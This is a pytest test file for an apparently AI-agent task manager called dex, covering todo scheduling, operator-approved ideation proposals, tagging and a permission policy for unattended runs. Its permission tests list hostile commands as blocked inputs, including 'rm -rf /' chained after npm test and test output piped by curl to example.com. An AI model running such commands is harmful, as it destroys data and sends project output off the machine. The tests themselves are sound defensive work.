"""Work that waits for dex to be idle, and gives way to anything else (dex/todos.py)."""

from __future__ import annotations

import asyncio
import json
import re
from datetime import UTC, datetime

import pytest

from dex.bus import EventBus
from dex.deps import Refused
from dex.models import Task, TaskState
from dex.queue import TaskManager
from dex.store import ThreadStore
from dex.changes import magnitude
from dex.todos import _write_tag


@pytest.fixture
async def manager(config, db, monkeypatch):
    bus = EventBus(db)
    await bus.start()
    m = TaskManager(config, bus, db)
    monkeypatch.setattr(TaskManager, "starting_up", property(lambda self: False))

    async def post(thread_id, message):
        pass

    m.post = post
    try:
        yield m
    finally:
        await m.todos.stop()
        await m.graph.stop()
        await bus.stop()


async def split(m, *titles):
    root = await m.submit("do things", title="Things", scope="todos", options={"todo": True})
    made = await m.todos.add(root, [{"title": t, "spec": f"Do {t}."} for t in titles])
    await m.tasks.set_state(root.id, TaskState.SUCCEEDED, finished_at=1.0)
    return root, made


async def state(m, task):
    return (await m.tasks.get(task.id)).state


async def test_todos_wait_in_todo_in_the_power_thread(manager, db):
    root, (a, b) = await split(manager, "a", "b")
    assert await state(manager, a) is TaskState.TODO
    assert a.scope == "power" and a.todo == root.id
    thread = await ThreadStore(db).get(a.thread_id)
    assert thread.title == "Power"


async def test_a_todo_is_never_claimed_by_a_worker(manager):
    await split(manager, "a")
    assert await manager.tasks.claim("w", interactive=False) is None


async def test_idle_starts_one_todo_at_a_time_oldest_first(manager):
    _, (a, b) = await split(manager, "a", "b")
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.QUEUED
    assert await state(manager, b) is TaskState.TODO

    await manager.todos.tick()
    assert await state(manager, b) is TaskState.TODO

    await manager.tasks.set_state(a.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert await state(manager, b) is TaskState.QUEUED


async def test_nothing_starts_while_regular_work_runs(manager):
    _, (a,) = await split(manager, "a")
    other = await manager.submit("regular", title="Regular")
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.TODO

    await manager.tasks.set_state(other.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.QUEUED


async def test_a_held_pause_and_a_waiting_question_do_not_count_as_running(manager):
    _, (a,) = await split(manager, "a")
    held = await manager.submit("held", title="Held")
    await manager.tasks.set_state(held.id, TaskState.PAUSED, held=True, started_at=1.0)
    asking = await manager.submit("asking", title="Asking")
    await manager.tasks.set_state(asking.id, TaskState.AWAITING_INPUT)
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.QUEUED


async def test_a_splitting_run_is_not_regular_work(manager):
    _, (a,) = await split(manager, "a")
    await manager.submit("more", title="More", scope="todos", options={"todo": True})
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.QUEUED


async def test_regular_work_sends_a_todo_and_all_it_spawned_back(manager, db):
    await ThreadStore(db).create("Music", "algorithms")
    _, (a,) = await split(manager, "a")
    await manager.todos.tick()
    await manager.tasks.set_state(a.id, TaskState.RUNNING, session_id="s1")
    a = await manager.tasks.get(a.id)

    # It starts a task, which starts another: both are its family.
    child = await manager.graph.spawn(a, thread="Music", title="c", brief="c")
    grandchild = await manager.graph.spawn(child, thread="Music", title="g", brief="g")
    assert child.todo == a.todo and grandchild.todo == a.todo
    await manager.graph.park(a, [child.id])
    await manager.graph.park(child, [grandchild.id])
    await manager.tasks.set_state(grandchild.id, TaskState.RUNNING, session_id="s3")

    live = await manager.tasks.get(grandchild.id)
    live.runtime = asyncio.create_task(asyncio.sleep(60))
    manager.live[live.id] = live

    await manager.submit("regular", title="Regular")
    await manager.todos.tick()
    for task in (a, child, grandchild):
        assert await state(manager, task) is TaskState.TODO
    assert live.runtime.cancelling() or live.runtime.cancelled()
    assert (await manager.tasks.get(grandchild.id)).resumed_from == "s3"
    assert (await manager.tasks.get(a.id)).waiting_on == [child.id]
    manager.live.clear()


async def test_a_family_resumes_where_it_was(manager, db):
    await ThreadStore(db).create("Music", "algorithms")
    _, (a,) = await split(manager, "a")
    await manager.todos.tick()
    await manager.tasks.set_state(a.id, TaskState.RUNNING, session_id="s1")
    child = await manager.graph.spawn(await manager.tasks.get(a.id), thread="Music", title="c", brief="c")
    await manager.graph.park(await manager.tasks.get(a.id), [child.id])

    regular = await manager.submit("regular", title="Regular")
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.TODO
    assert await state(manager, child) is TaskState.TODO

    await manager.tasks.set_state(regular.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    # The parent goes back to waiting, and what it waits for runs.
    assert await state(manager, a) is TaskState.BLOCKED
    assert await state(manager, child) is TaskState.QUEUED


async def test_a_run_recording_its_pause_late_is_still_sent_back(manager):
    _, (a,) = await split(manager, "a")
    await manager.tasks.set_state(a.id, TaskState.PAUSED, started_at=1.0)
    assert await manager.tasks.paused(interactive=False) == []
    await manager.submit("regular", title="Regular")
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.TODO


async def test_a_todo_can_start_tasks_and_a_plain_power_task_cannot(manager, db):
    await ThreadStore(db).create("Power", "algorithms")
    _, (a,) = await split(manager, "a")
    assert (await manager.graph.spawn_power(a, title="x", brief="y")).todo == a.todo
    plain = await manager.submit("p", title="P", scope="power")
    with pytest.raises(Refused, match="starts no tasks"):
        await manager.graph.spawn_power(plain, title="x", brief="y")


async def test_a_split_is_bounded_and_needs_specs(manager):
    root = await manager.submit("r", title="R", scope="todos", options={"todo": True})
    with pytest.raises(Refused, match="no todos"):
        await manager.todos.add(root, [{"title": "x", "spec": " "}])
    with pytest.raises(Refused, match="most one request"):
        await manager.todos.add(root, [{"title": "x", "spec": "y"}] * 21)


async def test_submitting_regular_work_wakes_the_loop(manager):
    await manager.submit("regular", title="Regular")
    assert manager.todos._wake.is_set()


def test_the_todo_state_is_not_terminal():
    assert not TaskState.TODO.terminal
    assert TaskState.TODO.waiting
    assert Task(problem="p", title="t", slug="t", scope="todos").is_todos
    assert Task(problem="p", title="t", slug="t", scope="todos").interactive


def enable_power(config, project):
    from dex import skills
    directory = config.project_dir(project)
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "skills.json").write_text(json.dumps({"skills": {"power": "abc"}}))
    assert "power" in skills.read_enabled(directory).skills


@pytest.fixture
async def project(manager, config):
    enable_power(config, config.default_project)
    return config.default_project


async def propose(m, ideation, *titles):
    return await m.todos.add(ideation, [{"title": t, "spec": f"Do {t}.", "code_lines": 40, "asset_lines": 0,
                                          "severity": "low", "sampled": "1 of 8 tests"}
                                         for t in titles])


def manifest(config, task):
    return json.loads((task.output_dir(config.assets_dir, config.default_project) / "manifest.json").read_text())


async def test_a_todo_has_a_spec_and_a_tag_in_its_own_directory(manager, config):
    _, (a, b) = await split(manager, "a", "b")
    await manager.todos.tick()
    assert a.slug != b.slug
    directory = a.output_dir(config.assets_dir, config.default_project)
    assert (directory / "SPEC.md").read_text() == "Do a.\n"
    assert manifest(config, a)["tags"] == ["todo:approved"]
    assert a.approval == "approved"


async def test_a_finished_todo_is_tagged_done_and_keeps_its_other_tags(manager, config):
    _, (a,) = await split(manager, "a")
    _write_tag(a.output_dir(config.assets_dir, config.default_project), "a", "todo:approved")
    path = a.output_dir(config.assets_dir, config.default_project) / "manifest.json"
    path.write_text(json.dumps({"title": "Mine", "tags": ["type:code", "todo:approved"]}))
    await manager.tasks.set_state(a.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert manifest(config, a) == {"title": "Mine", "tags": ["type:code", "todo:done"]}


async def test_prioritize_makes_a_todo_regular_for_good(manager):
    _, (a, b) = await split(manager, "a", "b")
    assert await manager.graph.prioritize(a.id)
    fresh = await manager.tasks.get(a.id)
    assert fresh.state is TaskState.QUEUED and fresh.priority == 2 and not fresh.todo
    await manager.todos.tick()
    # Regular work now: it stays queued, and the other todo waits for it.
    assert await state(manager, a) is TaskState.QUEUED
    assert await state(manager, b) is TaskState.TODO


async def test_a_paused_todo_does_not_hold_up_the_next(manager):
    _, (a, b) = await split(manager, "a", "b")
    await manager.pause_task(a.id)
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.PAUSED
    assert await state(manager, b) is TaskState.QUEUED


async def test_ideation_is_created_once_and_force_replaces_it(manager, project):
    first = await manager.todos.discovery(project)
    assert first.state is TaskState.TODO
    with pytest.raises(Refused, match="already has"):
        await manager.todos.discovery(project)
    await manager.pause_task(first.id)
    with pytest.raises(Refused, match="already has"):
        await manager.todos.discovery(project)
    second = await manager.todos.discovery(project, force=True)
    assert await state(manager, first) is TaskState.CANCELLED
    fresh = await manager.tasks.get(second.id)
    assert fresh.state is TaskState.QUEUED and fresh.priority == 2 and not fresh.todo


async def test_ideation_needs_the_power_skill(manager, config):
    with pytest.raises(Refused, match="not enabled"):
        await manager.todos.discovery(config.default_project)


async def test_ideation_runs_only_when_nothing_else_can(manager, project):
    ideation = await manager.todos.discovery(project)
    _, (a,) = await split(manager, "a")
    await manager.todos.tick()
    assert await state(manager, a) is TaskState.QUEUED
    assert await state(manager, ideation) is TaskState.TODO
    await manager.tasks.set_state(a.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert await state(manager, ideation) is TaskState.QUEUED


async def test_ideation_gives_way_to_a_regular_task_and_to_an_approved_todo(manager, project):
    ideation = await manager.todos.discovery(project)
    await manager.todos.tick()
    assert await state(manager, ideation) is TaskState.QUEUED
    regular = await manager.submit("now", title="now")
    await manager.todos.tick()
    assert await state(manager, ideation) is TaskState.TODO
    await manager.tasks.set_state(regular.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert await state(manager, ideation) is TaskState.QUEUED
    await split(manager, "a")
    await manager.todos.tick()
    assert await state(manager, ideation) is TaskState.TODO


async def test_a_proposal_waits_for_approval_and_does_not_hold_ideation_back(manager, project, config):
    ideation = await manager.todos.discovery(project)
    await manager.tasks.set_state(ideation.id, TaskState.RUNNING)
    p, = await propose(manager, await manager.tasks.get(ideation.id), "idea")
    assert p.state is TaskState.TODO and p.approval == "pending" and p.proposed
    assert await manager.graph.store.of(ideation.id) == []
    await manager.tasks.set_state(ideation.id, TaskState.CANCELLED, finished_at=1.0)
    next_one = await manager.todos.discovery(project)
    await manager.todos.tick()
    assert await state(manager, p) is TaskState.TODO
    assert await state(manager, next_one) is TaskState.QUEUED
    assert manifest(config, p)["tags"] == ["code-lines:2c", "asset-lines:0a", "severity:🔵 low", "todo:pending-approval"]


async def test_approve_and_reject_can_be_changed_and_only_approved_runs(manager, project, config):
    ideation = await manager.todos.discovery(project)
    p, = await propose(manager, ideation, "idea")
    with pytest.raises(Refused, match="approved first"):
        await manager.graph.prioritize(p.id)
    assert (await manager.todos.decide(p.id, "rejected")).approval == "rejected"
    assert manifest(config, p)["tags"] == ["code-lines:2c", "asset-lines:0a", "severity:🔵 low", "todo:rejected"]
    await manager.tasks.set_state(ideation.id, TaskState.CANCELLED, finished_at=1.0)
    await manager.todos.tick()
    assert await state(manager, p) is TaskState.TODO
    await manager.todos.decide(p.id, "approved")
    assert manifest(config, p)["tags"] == ["code-lines:2c", "asset-lines:0a", "severity:🔵 low", "todo:approved"]
    await manager.todos.tick()
    assert await state(manager, p) is TaskState.QUEUED
    with pytest.raises(Refused, match="not started"):
        await manager.todos.decide(p.id, "rejected")


async def test_a_todo_that_was_not_proposed_has_no_decision(manager):
    _, (a,) = await split(manager, "a")
    with pytest.raises(Refused):
        await manager.todos.decide(a.id, "rejected")


async def test_a_paused_ideation_task_stays_paused_and_alone(manager, project):
    first = await manager.todos.discovery(project)
    await manager.pause_task(first.id)
    await manager.todos.tick()
    assert await state(manager, first) is TaskState.PAUSED
    assert (await manager.tasks.current_ideation(project)).id == first.id


async def test_ideas_live_beside_the_assets_and_only_their_proposals_inside(manager, project, config):
    first = await manager.todos.discovery(project)
    directory = first.output_dir(config.assets_dir, config.default_project)
    assert directory == config.ideas_dir / project
    assert (directory / "IDEAS.md").read_text() == "# Ideas\n\n"
    p, = await propose(manager, first, "idea")
    assert (directory / p.slug / "SPEC.md").is_file()
    assert not (config.project_dir(project) / p.slug).exists()
    _, (a,) = await split(manager, "a")
    assert (config.project_dir(project) / a.slug / "SPEC.md").is_file()


async def test_ideation_always_runs_in_the_power_thread(manager, project, db):
    first = await manager.todos.discovery(project)
    assert (await ThreadStore(db).get(first.thread_id)).title == "Power"


async def test_a_thread_merely_starting_with_power_is_not_the_power_thread(manager, project, db):
    await manager.graph.resolve_thread(project, "Power · design", create=True)
    first = await manager.todos.discovery(project)
    assert (await ThreadStore(db).get(first.thread_id)).title == "Power"


async def test_adding_power_makes_its_thread_and_leaves_ideation_off(manager, project, db):
    await manager.todos.skill_changed(project, True)
    assert await db.pool.fetchval("SELECT count(*) FROM threads WHERE title = 'Power' AND project = $1", project) == 1
    assert await db.pool.fetchval("SELECT count(*) FROM tasks WHERE scope = 'ideation'") == 0
    assert (await manager.todos.status(project))["enabled"] is False


async def test_the_switch_starts_pauses_and_resumes_the_latest_task(manager, project):
    assert (await manager.todos.switch(project, True))["enabled"] is True
    task = await manager.tasks.current_ideation(project)
    off = await manager.todos.switch(project, False)
    assert off["enabled"] is False and off["state"] == "paused"
    await manager.todos.tick()
    assert (await manager.tasks.current_ideation(project)).id == task.id
    assert await state(manager, task) is TaskState.PAUSED
    assert (await manager.todos.switch(project, True))["taskId"] == task.id
    fresh = await manager.tasks.get(task.id)
    assert fresh.state is TaskState.TODO and not fresh.held


async def test_the_timer_adds_a_task_only_when_on_and_none_is_armed(manager, project, db):
    count = lambda: db.pool.fetchval("SELECT count(*) FROM tasks WHERE scope = 'ideation'")
    await manager.todos._arm_ideation()
    assert await count() == 0
    await manager.todos.switch(project, True)
    await manager.todos._arm_ideation()
    assert await count() == 1
    first = await manager.tasks.current_ideation(project)
    await manager.tasks.set_state(first.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    await manager.todos._arm_ideation()
    assert await count() == 2 and (await manager.tasks.current_ideation(project)).id != first.id


@pytest.mark.parametrize("ending", [TaskState.CANCELLED, TaskState.FAILED])
async def test_a_run_ending_badly_does_not_end_the_cycle(manager, project, ending):
    await manager.todos.switch(project, True)
    first = await manager.tasks.current_ideation(project)
    await manager.tasks.set_state(first.id, ending, finished_at=1.0)
    await manager.todos._arm_ideation()
    assert (await manager.tasks.current_ideation(project)).id != first.id


async def test_the_timer_leaves_a_switched_off_or_paused_project_alone(manager, project, db):
    await manager.todos.switch(project, True)
    await manager.todos.switch(project, False)
    task = await manager.tasks.current_ideation(project)
    await manager.tasks.set_state(task.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos._arm_ideation()
    assert await manager.tasks.current_ideation(project) is None
    await manager.todos.switch(project, True)
    manual = await manager.tasks.current_ideation(project)
    await manager.pause_task(manual.id)
    await manager.todos._arm_ideation()
    assert (await manager.tasks.current_ideation(project)).id == manual.id


async def test_the_timer_runs_every_ten_minutes(manager, project, monkeypatch):
    await manager.todos.tick()
    await manager.todos.switch(project, True)
    first = await manager.tasks.current_ideation(project)
    await manager.tasks.set_state(first.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.tick()
    assert await manager.tasks.current_ideation(project) is None
    manager.todos._armed_at -= 601
    await manager.todos.tick()
    assert await manager.tasks.current_ideation(project) is not None


async def test_asking_turns_the_cycle_on_and_force_does_not(manager, project):
    await manager.todos.discovery(project, force=True)
    assert (await manager.todos.status(project))["enabled"] is False
    current = await manager.tasks.current_ideation(project)
    await manager.tasks.set_state(current.id, TaskState.SUCCEEDED, finished_at=1.0)
    await manager.todos.discovery(project)
    assert (await manager.todos.status(project))["enabled"] is True


async def test_the_switch_needs_the_power_skill(manager, config):
    assert (await manager.todos.status(config.default_project))["available"] is False
    with pytest.raises(Refused, match="not enabled"):
        await manager.todos.switch(config.default_project, True)


async def test_removing_power_turns_the_cycle_off_and_pauses_it(manager, project):
    await manager.todos.switch(project, True)
    await manager.todos.skill_changed(project, False)
    assert (await manager.todos.status(project))["enabled"] is False
    assert (await manager.tasks.current_ideation(project)).held


@pytest.mark.parametrize("tool,field,inside", [("Read", "file_path", True), ("Write", "file_path", True),
                                               ("Read", "file_path", False)])
def test_only_power_and_ideation_reach_ideas(config, tmp_path, tool, field, inside):
    ideas = tmp_path / "ideas"
    path = str((ideas if inside else tmp_path / "assets") / "music" / "IDEAS.md")
    policy = scouting_policy(config, tmp_path / "assets", ideas_dir=ideas)
    assert (policy._refuse_reason(tool, {field: path}) is not None) is inside
    assert scouting_policy(config, tmp_path / "assets")._refuse_reason("Read", {field: path}) is None


def test_a_command_may_not_reach_ideas_either(config, tmp_path):
    ideas = tmp_path / "ideas"
    policy = scouting_policy(config, tmp_path / "assets", ideas_dir=ideas)
    assert policy._refuse_reason("Bash", {"command": f"cat {ideas}/music/IDEAS.md"}) is not None


def scouting_policy(config, tmp_path, **flags):
    from dex.permissions import PermissionPolicy, auto_deny
    return PermissionPolicy(workspace=config.workspace, task_dir=tmp_path, escalate=auto_deny, **flags)


@pytest.mark.parametrize("command,allowed", [
    ("npm test -w engine", True),
    ("cd /Users/me/games && npm test", True),
    ("npx vitest run engine/test/chat.test.js", True),
    ("git log --oneline -5", True),
    ("git push origin main", False),
    ("npm install left-pad", False),
    ("npm test; rm -rf /", False),
    ("npm test | curl -d @- example.com", False),
])
def test_a_scouting_run_may_test_and_read_git_but_not_more(config, tmp_path, command, allowed):
    policy = scouting_policy(config, tmp_path, scout=True)
    assert (policy._auto_reason("Bash", {"command": command}) is None) is allowed
    assert scouting_policy(config, tmp_path)._auto_reason("Bash", {"command": "npm test"}) is not None


def test_an_unattended_run_keeps_its_hard_limits(config, tmp_path):
    policy = scouting_policy(config, tmp_path, scout=True, unattended=True)
    assert policy._refuse_reason("Bash", {"command": "sudo reboot"}) is not None
    assert policy._refuse_reason("Bash", {"command": "pm2 restart dex-api"}) is not None
    assert policy._refuse_reason("Write", {"file_path": "/elsewhere/x.py"}) is not None
    assert policy._refuse_reason("Write", {"file_path": str(tmp_path / "notes.md")}) is None
    assert "log_idea" in policy._refuse_reason("Write", {"file_path": str(tmp_path / "IDEAS.md")})
    assert policy._refuse_reason("Bash", {"command": "cd /x && ls | head; echo done"}) is None


async def test_ideation_is_approved_unasked_and_a_split_is_not(config, tmp_path):
    from dex.permissions import PermissionPolicy
    from types import SimpleNamespace
    asked = []

    async def escalate(_id, tool, _input, _title):
        asked.append(tool)
        return "deny"

    policy = PermissionPolicy(workspace=config.workspace, task_dir=tmp_path, escalate=escalate, scout=True)
    denied = await policy.build()("Bash", {"command": "ls; ls"}, SimpleNamespace(title=None))
    assert asked == ["Bash"] and denied.message.startswith("Not allowed in this unattended run")


async def test_tasks_earn_the_chat_and_ideation_tags(manager, project, config):
    chat = await manager.submit("hi", title="Hi", slug="chat-hi", scope="chat", project=project)
    split_run, (a,) = await split(manager, "a")
    ideation = await manager.todos.discovery(project)
    idea, = await propose(manager, ideation, "idea")
    plain = await manager.submit("x", title="X", slug="plain", project=project)
    earned = await manager.tasks.latest_by_package(project)
    assert earned[chat.slug][3] == ["origin:chat"]
    assert earned[split_run.slug][3] == ["origin:chat"]
    assert earned[a.slug][3] == ["origin:ideation"]
    assert earned[idea.slug][3] == ["origin:ideation"]
    assert earned[ideation.slug][3] == ["origin:ideation"]
    assert earned[plain.slug][3] == []
    assert not (chat.output_dir(config.assets_dir, project) / "manifest.json").exists()


async def test_ideation_and_its_proposals_show_in_the_thread(manager, project):
    """The chat draws messages, not tasks: without one a run is real and invisible."""
    posted = []

    async def post(thread_id, message):
        posted.append((thread_id, message))

    manager.post = post
    ideation = await manager.todos.discovery(project)
    proposal, = await propose(manager, await manager.tasks.get(ideation.id), "idea")

    assert [(t, m.kind) for t, m in posted] == [(ideation.thread_id, "tasks"), (proposal.thread_id, "tasks")]
    assert [t["id"] for t in posted[0][1].data["tasks"]] == [ideation.id]
    assert [t["id"] for t in posted[1][1].data["tasks"]] == [proposal.id]
    assert "approval" in posted[1][1].text


async def test_a_message_that_cannot_be_posted_does_not_lose_the_work(manager, project):
    async def post(_thread_id, _message):
        raise RuntimeError("no database")

    manager.post = post

    assert (await manager.todos.discovery(project)).is_ideation


async def test_a_proposal_says_what_it_is_and_who_proposed_it(manager, project, config):
    """It has to be readable before it runs, or there is nothing to approve."""
    ideation = await manager.todos.discovery(project)
    proposal, = await propose(manager, await manager.tasks.get(ideation.id), "idea")

    told = proposal.to_json(config.assets_dir)

    assert told["spawnedBy"] == ideation.id
    assert told["filesPath"] == f"ideas/{project}/{proposal.slug}"
    assert told["specPath"] == f"ideas/{project}/{proposal.slug}/SPEC.md"
    spec = config.ideas_dir / project / proposal.slug / "SPEC.md"
    assert spec.read_text().endswith("\n\nDo idea.\n")


async def test_a_todo_with_no_spec_cannot_be_approved(manager, project, config):
    ideation = await manager.todos.discovery(project)
    proposal, = await propose(manager, await manager.tasks.get(ideation.id), "idea")
    (config.ideas_dir / project / proposal.slug / "SPEC.md").unlink()

    with pytest.raises(Refused, match="nothing to approve"):
        await manager.todos.decide(proposal.id, "approved")

    assert (await manager.todos.decide(proposal.id, "rejected")).approval == "rejected"



async def test_the_log_is_timestamped_one_liners_newest_first(manager, project, config):
    await manager.todos.discovery(project)
    manager.todos.log(project, "tested: one\ntwo   words")
    manager.todos.log(project, "x" * 300)
    lines = (config.ideas_dir / project / "IDEAS.md").read_text().splitlines()
    assert lines[:2] == ["# Ideas", ""]
    assert re.fullmatch(r"- \d{4}-\d\d-\d\dT\d\d:\d\dZ x{199}…", lines[2])
    assert lines[3].endswith(" tested: one two words") and len(lines) == 4


async def test_proposals_and_decisions_log_themselves(manager, project, config):
    ideation = await manager.todos.discovery(project)
    p, = await propose(manager, ideation, "idea")
    await manager.todos.decide(p.id, "rejected")
    lines = (config.ideas_dir / project / "IDEAS.md").read_text().splitlines()
    assert f"rejected by the operator: idea ({p.slug})" in lines[2]
    assert f"proposed: idea ({p.slug})" in lines[3]


async def test_a_chat_todo_is_not_logged(manager, project, config):
    await split(manager, "a")
    assert not (config.ideas_dir / project / "IDEAS.md").exists()


@pytest.mark.parametrize("lines,order", [(0, 0), (1, 0), (2, 1), (10, 1), (11, 2), (100, 2), (101, 3),
                                         (10**5, 5), (10**5 + 1, 6), (10**6, 6), (10**9, 6)])
def test_the_magnitude_is_the_power_of_ten_that_bounds_it(lines, order):
    assert magnitude(lines) == order


async def test_a_proposal_states_its_estimate_and_is_tagged_by_it(manager, project, config):
    ideation = await manager.todos.discovery(project)
    p, = await manager.todos.add(ideation, [{"title": "i", "spec": "Why.", "code_lines": 1500, "asset_lines": 7,
                                                "severity": "medium", "sampled": "4 of 12 random stories"}])
    directory = p.output_dir(config.assets_dir, config.default_project)
    assert (directory / "SPEC.md").read_text() == (
        "**Estimated change:** up to 1,500 lines of code (4c), up to 7 lines of assets (1a)\n\n"
        "**Severity:** 🟠 medium. Sampled: 4 of 12 random stories\n\nWhy.\n")
    await manager.todos.tick()
    assert json.loads((directory / "manifest.json").read_text())["tags"] == [
        "code-lines:4c", "asset-lines:1a", "severity:🟠 medium", "todo:pending-approval"]


@pytest.mark.parametrize("item", [{}, {"code_lines": 5}, {"code_lines": -1, "asset_lines": 0},
                                  {"code_lines": "5", "asset_lines": 0}])
async def test_a_proposal_without_an_estimate_is_refused(manager, project, item):
    ideation = await manager.todos.discovery(project)
    with pytest.raises(Refused, match="code_lines"):
        await manager.todos.add(ideation, [{"title": "i", "spec": "Why.", **item}])


@pytest.mark.parametrize("item", [{}, {"severity": "low"}, {"sampled": "3 of 9"}, {"severity": "low", "sampled": " "},
                                  {"severity": "urgent", "sampled": "3 of 9"}])
async def test_a_proposal_without_a_measured_severity_is_refused(manager, project, item):
    ideation = await manager.todos.discovery(project)
    with pytest.raises(Refused, match="severity"):
        await manager.todos.add(ideation, [{"title": "i", "spec": "Why.", "code_lines": 5, "asset_lines": 0, **item}])


async def test_a_feature_improvement_is_incremental_and_needs_no_sample(manager, project, config):
    ideation = await manager.todos.discovery(project)
    p, = await manager.todos.add(ideation, [{"title": "i", "spec": "Why.", "code_lines": 5, "asset_lines": 0,
                                             "severity": "incremental"}])
    directory = p.output_dir(config.assets_dir, config.default_project)
    assert "**Severity:** 🟢 incremental.\n\nWhy.\n" in (directory / "SPEC.md").read_text()
    assert "severity:🟢 incremental" in json.loads((directory / "manifest.json").read_text())["tags"]


async def test_a_reassessment_replaces_pending_proposals(manager, project, config):
    first = await manager.todos.discovery(project)
    old, other = await propose(manager, first, "old", "other")
    new, = await manager.todos.add(first, [{"title": "new", "spec": "Why.", "code_lines": 5, "asset_lines": 0,
                                            "severity": "incremental", "replaces": [old.id]}])
    assert (await manager.tasks.get(old.id)).options["approval"] == "rejected"
    assert (await manager.tasks.get(other.id)).options["approval"] == "pending"
    assert (await manager.tasks.get(new.id)).options["approval"] == "pending"
    log = (config.ideas_dir / project / "IDEAS.md").read_text()
    assert f"rejected by its reassessment: old ({old.slug})" in log
    assert await manager.todos.decide(old.id, "pending") is not None


async def test_only_a_pending_proposal_can_be_replaced(manager, project):
    first = await manager.todos.discovery(project)
    done, = await propose(manager, first, "done")
    await manager.todos.decide(done.id, "approved")
    with pytest.raises(Refused, match="can't be replaced"):
        await manager.todos.add(first, [{"title": "new", "spec": "Why.", "code_lines": 5, "asset_lines": 0,
                                         "severity": "incremental", "replaces": [done.id]}])


async def test_a_chat_todo_needs_no_severity(manager, project):
    chat = await manager.submit("x", scope="todos", project=project)
    assert await manager.todos.add(chat, [{"title": "i", "spec": "Why."}])


def test_code_and_documentation_are_code_and_the_rest_are_assets():
    from dex.changes import is_code, tally
    for path in ("a/x.py", "x.TS", "README.md", "notes.txt", "Makefile"):
        assert is_code(path)
    for path in ("story.json", "a.yaml", "b.csv", "c.svg", "noextension"):
        assert not is_code(path)
    assert tally([("a.py", 5), ("a.md", 2), ("s.json", 7), (".claude/m.md", 9), ("x/node_modules/y.js", 9)]) == (7, 7)


def test_a_binary_file_has_no_lines(tmp_path):
    from dex.changes import file_lines
    (tmp_path / "a.txt").write_text("one\ntwo\n")
    (tmp_path / "b.glb").write_bytes(b"glTF\0\0\xff\xfe")
    (tmp_path / "c.bin").write_bytes(b"\xff\xfe\xfd")
    assert (file_lines(tmp_path / "a.txt"), file_lines(tmp_path / "b.glb"), file_lines(tmp_path / "c.bin")) == (2, 0, 0)


async def test_lines_add_up_and_become_a_packages_tags(manager, project):
    first = await manager.submit("x", title="X", slug="pack", project=project)
    follow = await manager.submit("y", title="Y", slug="pack-2", project=project, output_slug="pack", parent_id=first.id)
    await manager.tasks.add_changes(first.id, 8, 3)
    await manager.tasks.add_changes(first.id, 4, 0)
    await manager.tasks.add_changes(follow.id, 0, 95)
    assert (await manager.tasks.latest_by_package(project))["pack"][3] == ["code-lines:2c", "asset-lines:2a"]


async def test_the_dashboard_sums_lines_by_group_and_project(manager, project, db):
    from dex.store import CostStore
    for slug, lines, where in (("one", (10, 3), project), ("two", (5, 0), project), ("idle", (0, 0), project)):
        task = await manager.submit(slug, title=slug, slug=slug, project=where)
        await manager.tasks.add_changes(task.id, *lines)
    store = CostStore(db)
    points = await store.line_series("week", "day", "project")
    assert {p["series"]: (p["code"], p["assets"]) for p in points} == {project: (15, 3)}
    only = await store.line_series("week", "day", "skill", [project])
    assert [(p["series"], p["code"], p["assets"]) for p in only] == [("(no skill)", 15, 3)]
    assert await store.line_series("week", "day", "project", offset=1) == []


async def test_a_package_gets_its_size_tags_as_lines_add_up(manager, project):
    task = await manager.submit("x", title="X", slug="grows", project=project)
    assert await manager.tasks.package_sizes(project, "grows") == []
    await manager.tasks.add_changes(task.id, 10, 0)
    assert await manager.tasks.package_sizes(project, "grows") == ["code-lines:1c", "asset-lines:0a"]
    await manager.tasks.add_changes(task.id, 1, 200)
    assert await manager.tasks.package_sizes(project, "grows") == ["code-lines:2c", "asset-lines:3a"]
